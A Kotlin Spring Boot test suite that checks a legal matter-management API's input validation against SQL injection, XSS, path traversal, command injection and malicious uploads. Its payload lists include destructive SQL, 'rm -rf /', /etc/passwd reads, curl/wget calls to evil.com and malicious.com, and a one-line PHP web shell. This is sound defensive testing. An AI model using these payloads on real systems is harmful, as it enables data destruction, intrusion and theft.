package dev.ryuzu.astermanagement.security

import dev.ryuzu.astermanagement.dto.matter.CreateMatterRequest
import dev.ryuzu.astermanagement.dto.matter.UpdateMatterRequest
import dev.ryuzu.astermanagement.modules.matter.domain.MatterPriority
import java.util.UUID
import java.time.LocalDate
import dev.ryuzu.astermanagement.domain.user.User
import dev.ryuzu.astermanagement.domain.user.UserRepository
import dev.ryuzu.astermanagement.domain.user.UserRole
import dev.ryuzu.astermanagement.service.JwtService
import com.fasterxml.jackson.databind.ObjectMapper
import org.junit.jupiter.api.*
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureWebMvc
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.http.MediaType
import org.springframework.mock.web.MockMultipartFile
import org.springframework.test.context.ActiveProfiles
import org.springframework.test.web.servlet.MockMvc
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.*
import org.springframework.transaction.annotation.Transactional
import org.junit.jupiter.api.Assertions.assertTrue
import org.hamcrest.Matchers.*
import java.util.*

/**
 * Input Validation Security Test Suite
 * 
 * Comprehensive tests for input validation and sanitization security.
 * Tests protection against SQL injection, XSS attacks, oversized inputs,
 * file upload security, and malicious payload detection.
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureWebMvc
@ActiveProfiles("test")
@TestMethodOrder(MethodOrderer.OrderAnnotation::class)
@Transactional
class InputValidationSecurityTest {

    @Autowired
    private lateinit var mockMvc: MockMvc

    @Autowired
    private lateinit var objectMapper: ObjectMapper

    @Autowired
    private lateinit var jwtService: JwtService

    @Autowired
    private lateinit var userRepository: UserRepository

    private lateinit var testLawyer: User
    private lateinit var lawyerToken: String

    companion object {
        private const val MATTERS_BASE_URL = "/api/v1/matters"
        private const val DOCUMENTS_BASE_URL = "/api/v1/documents"
        private const val SEARCH_BASE_URL = "/api/v1/search"

        // SQL Injection Payloads
        private val SQL_INJECTION_PAYLOADS = listOf(
            "'; DROP TABLE matters; --",
            "1' OR '1'='1",
            "1'; UPDATE users SET role='ADMIN' WHERE '1'='1",
            "1' UNION SELECT * FROM users--",
            "1'; INSERT INTO matters (title) VALUES ('hacked'); --",
            "admin'--",
            "admin' /*",
            "admin' OR 1=1--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --"
        )

        // XSS Payloads
        private val XSS_PAYLOADS = listOf(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<svg><script>alert('XSS')</script></svg>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<form action=\"javascript:alert('XSS')\"><input type=submit>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        )

        // Path Traversal Payloads
        private val PATH_TRAVERSAL_PAYLOADS = listOf(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%5c..%5c..%5cetc%5cpasswd",
            ".././.././.././etc/passwd",
            ".\\.\\.\\.\\etc\\passwd",
            "..//..//..//etc//passwd"
        )

        // Command Injection Payloads
        private val COMMAND_INJECTION_PAYLOADS = listOf(
            "; ls -la",
            "| whoami",
            "& ping google.com",
            "`id`",
            "\$(whoami)",
            "; cat /etc/passwd",
            "| net user",
            "& dir",
            "; rm -rf /",
            "| format c:",
            "\$(curl http://evil.com)",
            "`wget http://malicious.com/shell.sh`"
        )
    }

    @BeforeEach
    fun setup() {
        testLawyer = createTestUser("test.lawyer", "lawyer@test.com", UserRole.LAWYER)
        lawyerToken = jwtService.generateAccessToken(testLawyer)
    }

    private fun createTestUser(username: String, email: String, role: UserRole): User {
        val user = User().apply {
            this.id = UUID.randomUUID()
            this.username = username
            this.email = email
            this.firstName = username.split(".")[0].capitalize()
            this.lastName = username.split(".")[1].capitalize()
            this.role = role
            this.isActive = true
        }
        return userRepository.save(user)
    }

    // ========== SQL INJECTION TESTS ==========

    @Test
    @Order(1)
    fun `should reject SQL injection attempts in matter creation`() {
        SQL_INJECTION_PAYLOADS.forEach { payload ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = payload,
                description = "Test description",
                clientName = "Test Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors").exists())
                .andExpect(jsonPath("$.errors[*].field").value(hasItem("title")))
                .andExpect(jsonPath("$.errors[*].message").value(hasItem(containsString("invalid characters"))))
        }
    }

    @Test
    @Order(2)
    fun `should reject SQL injection attempts in search queries`() {
        SQL_INJECTION_PAYLOADS.forEach { payload ->
            mockMvc.perform(get("$MATTERS_BASE_URL/search")
                .header("Authorization", "Bearer $lawyerToken")
                .param("query", payload))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.error").value(containsString("Invalid search query")))
        }
    }

    @Test
    @Order(3)
    fun `should reject SQL injection in matter updates`() {
        SQL_INJECTION_PAYLOADS.forEach { payload ->
            val updateRequest = UpdateMatterRequest(
                title = payload,
                description = "Updated description",
                clientName = "Test Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(put("$MATTERS_BASE_URL/123")
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(updateRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors").exists())
        }
    }

    // ========== XSS PROTECTION TESTS ==========

    @Test
    @Order(4)
    fun `should sanitize XSS attempts in matter creation`() {
        XSS_PAYLOADS.forEach { payload ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = payload,
                description = "Test description",
                clientName = "Test Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors[*].field").value(hasItem("title")))
                .andExpect(jsonPath("$.errors[*].message").value(hasItem(containsString("invalid characters"))))
        }
    }

    @Test
    @Order(5)
    fun `should sanitize XSS attempts in descriptions`() {
        XSS_PAYLOADS.forEach { payload ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = "Valid Title",
                description = payload,
                clientName = "Test Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors[*].field").value(hasItem("description")))
        }
    }

    @Test
    @Order(6)
    fun `should sanitize XSS attempts in client names`() {
        XSS_PAYLOADS.forEach { payload ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = "Valid Title",
                description = "Valid description",
                clientName = payload,
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors[*].field").value(hasItem("clientName")))
        }
    }

    // ========== INPUT SIZE VALIDATION TESTS ==========

    @Test
    @Order(7)
    fun `should reject oversized inputs`() {
        // Test oversized title (limit is 255)
        val oversizedTitle = "A".repeat(300)
        val matterRequest = CreateMatterRequest(
            caseNumber = "2024-CV-1234",
            title = oversizedTitle,
            description = "Test description",
            clientName = "Test Client",
            clientContact = "test@example.com",
            opposingParty = "Test Opposition",
            courtName = "Test Court",
            filingDate = LocalDate.now(),
            estimatedCompletionDate = LocalDate.now().plusDays(30),
            priority = MatterPriority.MEDIUM,
            assignedLawyerId = UUID.randomUUID(),
            assignedClerkId = null,
            notes = "Test notes",
            tags = emptyList()
        )

        mockMvc.perform(post(MATTERS_BASE_URL)
            .header("Authorization", "Bearer $lawyerToken")
            .contentType(MediaType.APPLICATION_JSON)
            .content(objectMapper.writeValueAsString(matterRequest)))
            .andExpect(status().isBadRequest)
            .andExpect(jsonPath("$.errors[*].field").value(hasItem("title")))
            .andExpect(jsonPath("$.errors[*].message").value(hasItem(containsString("255 characters"))))

        // Test oversized description (limit is 2000)
        val oversizedDescription = "B".repeat(2500)
        val matterRequestDesc = CreateMatterRequest(
            caseNumber = "2024-CV-1234",
            title = "Valid Title",
            description = oversizedDescription,
            clientName = "Test Client",
            clientContact = "test@example.com",
            opposingParty = "Test Opposition",
            courtName = "Test Court",
            filingDate = LocalDate.now(),
            estimatedCompletionDate = LocalDate.now().plusDays(30),
            priority = MatterPriority.MEDIUM,
            assignedLawyerId = UUID.randomUUID(),
            assignedClerkId = null,
            notes = "Test notes",
            tags = emptyList()
        )

        mockMvc.perform(post(MATTERS_BASE_URL)
            .header("Authorization", "Bearer $lawyerToken")
            .contentType(MediaType.APPLICATION_JSON)
            .content(objectMapper.writeValueAsString(matterRequestDesc)))
            .andExpect(status().isBadRequest)
            .andExpect(jsonPath("$.errors[*].field").value(hasItem("description")))
            .andExpect(jsonPath("$.errors[*].message").value(hasItem(containsString("2000 characters"))))
    }

    @Test
    @Order(8)
    fun `should reject invalid case number formats`() {
        val invalidCaseNumbers = listOf(
            "INVALID",
            "123456",
            "CA-2024-123",
            "AA2024123456",
            "CA20241234567",
            "ca2024-123456", // lowercase
            "CA2024-12345", // too short
            "CA2024-1234567" // too long
        )

        invalidCaseNumbers.forEach { invalidCaseNumber ->
            val matterRequest = CreateMatterRequest(
                caseNumber = invalidCaseNumber,
                title = "Valid Title",
                description = "Valid description",
                clientName = "Valid Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors[*].field").value(hasItem("caseNumber")))
                .andExpect(jsonPath("$.errors[*].message").value(hasItem(containsString("Invalid case number format"))))
        }
    }

    // ========== FILE UPLOAD SECURITY TESTS ==========

    @Test
    @Order(9)
    fun `should reject malicious file types`() {
        val maliciousFiles = listOf(
            MockMultipartFile("file", "malware.exe", "application/x-msdownload", "malicious content".toByteArray()),
            MockMultipartFile("file", "script.sh", "application/x-sh", "#!/bin/bash\nrm -rf /".toByteArray()),
            MockMultipartFile("file", "virus.com", "application/x-dosexec", "virus content".toByteArray()),
            MockMultipartFile("file", "payload.bat", "application/x-bat", "format c:".toByteArray()),
            MockMultipartFile("file", "trojan.scr", "application/x-msdownload", "trojan content".toByteArray()),
            MockMultipartFile("file", "malware.jar", "application/java-archive", "malicious jar".toByteArray()),
            MockMultipartFile("file", "evil.js", "application/javascript", "alert('xss')".toByteArray()),
            MockMultipartFile("file", "backdoor.php", "application/x-php", "<?php system(\$_GET['cmd']); ?>".toByteArray())
        )

        maliciousFiles.forEach { maliciousFile ->
            mockMvc.perform(multipart("$DOCUMENTS_BASE_URL/upload")
                .file(maliciousFile)
                .header("Authorization", "Bearer $lawyerToken"))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.error").value(containsString("File type not allowed")))
        }
    }

    @Test
    @Order(10)
    fun `should reject oversized files`() {
        // Test file exceeding 10MB limit
        val oversizedFile = MockMultipartFile(
            "file",
            "large.pdf",
            "application/pdf",
            ByteArray(11 * 1024 * 1024) // 11MB
        )

        mockMvc.perform(multipart("$DOCUMENTS_BASE_URL/upload")
            .file(oversizedFile)
            .header("Authorization", "Bearer $lawyerToken"))
            .andExpect(status().isBadRequest)
            .andExpect(jsonPath("$.error").value(containsString("File size exceeds")))
    }

    @Test
    @Order(11)
    fun `should sanitize file names`() {
        val maliciousFileNames = listOf(
            "../../../etc/passwd.pdf",
            "..\\..\\..\\windows\\system32\\config\\sam.pdf",
            "test<script>alert('xss')</script>.pdf",
            "test'; DROP TABLE files; --.pdf",
            "test|whoami.pdf",
            "test`id`.pdf",
            "test\$(rm -rf /).pdf",
            "test&ping google.com.pdf",
            "test;ls -la.pdf"
        )

        maliciousFileNames.forEach { fileName ->
            val file = MockMultipartFile(
                "file",
                fileName,
                "application/pdf",
                "valid pdf content".toByteArray()
            )

            mockMvc.perform(multipart("$DOCUMENTS_BASE_URL/upload")
                .file(file)
                .header("Authorization", "Bearer $lawyerToken"))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.error").value(containsString("Invalid filename")))
        }
    }

    // ========== PATH TRAVERSAL TESTS ==========

    @Test
    @Order(12)
    fun `should prevent path traversal attacks`() {
        PATH_TRAVERSAL_PAYLOADS.forEach { payload ->
            mockMvc.perform(get("$DOCUMENTS_BASE_URL/download")
                .header("Authorization", "Bearer $lawyerToken")
                .param("filename", payload))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.error").value(containsString("Invalid filename")))
        }
    }

    // ========== COMMAND INJECTION TESTS ==========

    @Test
    @Order(13)
    fun `should prevent command injection in search`() {
        COMMAND_INJECTION_PAYLOADS.forEach { payload ->
            mockMvc.perform(get("$MATTERS_BASE_URL/search")
                .header("Authorization", "Bearer $lawyerToken")
                .param("query", payload))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.error").value(containsString("Invalid search query")))
        }
    }

    // ========== PARAMETER POLLUTION TESTS ==========

    @Test
    @Order(14)
    fun `should handle parameter pollution attacks`() {
        // Test multiple parameters with same name
        mockMvc.perform(get("$MATTERS_BASE_URL/search")
            .header("Authorization", "Bearer $lawyerToken")
            .param("query", "legitimate")
            .param("query", "'; DROP TABLE matters; --")
            .param("limit", "10")
            .param("limit", "999999"))
            .andExpect(status().isBadRequest)
            .andExpect(jsonPath("$.error").value(containsString("Invalid")))
    }

    // ========== UNICODE AND ENCODING TESTS ==========

    @Test
    @Order(15)
    fun `should handle malicious unicode and encoding`() {
        val maliciousUnicodePayloads = listOf(
            "test\u0000null", // Null byte injection
            "test\u000bnewline", // Vertical tab
            "test\u000cformfeed", // Form feed
            "test\u000dcarriage", // Carriage return
            "test\u0085nextline", // Next line
            "test\u2028linesep", // Line separator
            "test\u2029parasep", // Paragraph separator
            "test%00null", // URL encoded null
            "test%0Anewline", // URL encoded newline
            "test%0Dreturn", // URL encoded carriage return
            "test\uFEFFbom", // BOM character
            "test\uFFFFreplacement" // Replacement character
        )

        maliciousUnicodePayloads.forEach { payload ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = payload,
                description = "Test description",
                clientName = "Test Client",
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andExpect(status().isBadRequest)
                .andExpect(jsonPath("$.errors").exists())
        }
    }

    // ========== POSITIVE VALIDATION TESTS ==========

    @Test
    @Order(16)
    fun `should accept valid inputs`() {
        val validMatterRequest = CreateMatterRequest(
            caseNumber = "2024-CV-1234",
            title = "Valid Matter Title",
            description = "This is a valid matter description with normal characters.",
            clientName = "John Doe",
            clientContact = "test@example.com",
            opposingParty = "Test Opposition",
            courtName = "Test Court",
            filingDate = LocalDate.now(),
            estimatedCompletionDate = LocalDate.now().plusDays(30),
            priority = MatterPriority.MEDIUM,
            assignedLawyerId = UUID.randomUUID(),
            assignedClerkId = null,
            notes = "Test notes",
            tags = emptyList()
        )

        mockMvc.perform(post(MATTERS_BASE_URL)
            .header("Authorization", "Bearer $lawyerToken")
            .contentType(MediaType.APPLICATION_JSON)
            .content(objectMapper.writeValueAsString(validMatterRequest)))
            .andExpect(status().isOk)
    }

    @Test
    @Order(17)
    fun `should accept valid file uploads`() {
        val validFile = MockMultipartFile(
            "file",
            "document.pdf",
            "application/pdf",
            "Valid PDF content".toByteArray()
        )

        mockMvc.perform(multipart("$DOCUMENTS_BASE_URL/upload")
            .file(validFile)
            .header("Authorization", "Bearer $lawyerToken"))
            .andExpect(status().isOk)
    }

    // ========== EDGE CASE TESTS ==========

    @Test
    @Order(18)
    fun `should handle edge cases gracefully`() {
        val edgeCases = listOf(
            "", // Empty string
            " ", // Space only
            "\t", // Tab only
            "\n", // Newline only
            "\r\n", // Windows newline
            "   \t  \n  ", // Mixed whitespace
            "a", // Single character
            "ab", // Two characters
            "123", // Numbers only
            "!@#$%^&*()_+-=[]{}|;':\",./<>?", // Special characters
            "café", // Unicode characters
            "🚀🎯⚡", // Emojis
            "test test test test test" // Multiple words
        )

        edgeCases.forEach { input ->
            val matterRequest = CreateMatterRequest(
                caseNumber = "2024-CV-1234",
                title = if (input.isBlank()) "Valid Title" else input,
                description = if (input.isBlank()) "Valid Description" else input,
                clientName = if (input.isBlank()) "Valid Client" else input,
                clientContact = "test@example.com",
                opposingParty = "Test Opposition",
                courtName = "Test Court",
                filingDate = LocalDate.now(),
                estimatedCompletionDate = LocalDate.now().plusDays(30),
                priority = MatterPriority.MEDIUM,
                assignedLawyerId = UUID.randomUUID(),
                assignedClerkId = null,
                notes = "Test notes",
                tags = emptyList()
            )

            // Should either succeed or fail gracefully with proper error message
            val result = mockMvc.perform(post(MATTERS_BASE_URL)
                .header("Authorization", "Bearer $lawyerToken")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(matterRequest)))
                .andReturn()

            // Should not return 500 (server error)
            assertTrue(result.response.status != 500, "Server error for input: '$input'")
        }
    }
}